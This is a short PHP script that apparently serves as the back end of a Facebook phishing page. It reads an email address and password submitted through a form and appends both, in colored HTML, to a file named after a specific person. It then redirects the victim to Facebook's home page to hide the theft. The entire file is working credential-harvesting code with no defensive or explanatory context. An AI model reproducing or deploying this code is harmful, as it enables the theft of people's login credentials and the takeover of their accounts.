<?php

$email = $_POST['email']; 
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("contracena-RobertoGutierrez.html", "a"); 
fwrite ($f, 'Correo: [<b><font color="#E621F0">'.$email.'</font></b>] Contrasena: [<b><font color="#F05921">'.$pass.'</font></b>] <br>');
fclose($f);

header("Location: https://www.facebook.com/home.php");
?>
